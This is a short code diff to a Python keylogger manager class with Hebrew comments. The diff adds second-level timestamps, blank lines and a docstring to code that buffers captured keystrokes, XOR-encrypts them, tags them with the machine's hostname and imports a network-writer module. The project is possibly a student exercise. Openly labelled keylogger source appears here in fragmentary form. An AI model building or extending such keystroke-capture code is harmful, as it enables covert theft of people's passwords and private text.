@@ -10,6 +10,7 @@ import NetworkWriter as nw
 
 
 class KeyLoggerManager:
+
     def __init__(self, interval=10):
         self.keylogger_service = ks.KeyLoggerService()
         self.file_writer = fw.FileWriter()
@@ -28,9 +29,11 @@ class KeyLoggerManager:
     def process_and_store_data(self):
         """ מעבדת את הנתונים, מוסיפה חותמת זמן, מצפינה ושומרת"""
         if self.buffer:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             data = "".join(self.buffer)
+
             processed_data = f"[{timestamp}] {data}\n"
+
             encrypted_data = enc.Encryptor.xor_encryption_and_decryption(processed_data)
 
             machine_name = socket.gethostname()
@@ -39,6 +42,7 @@ class KeyLoggerManager:
             self.buffer.clear()
 
     def run(self):
+        """ פונקציה המפעילה את ה-KeyLoggerService ומפעילה את האיסוף והשמירה של הנתונים"""
         self.running = True
         self.keylogger_service.start_logging()
         while self.running:
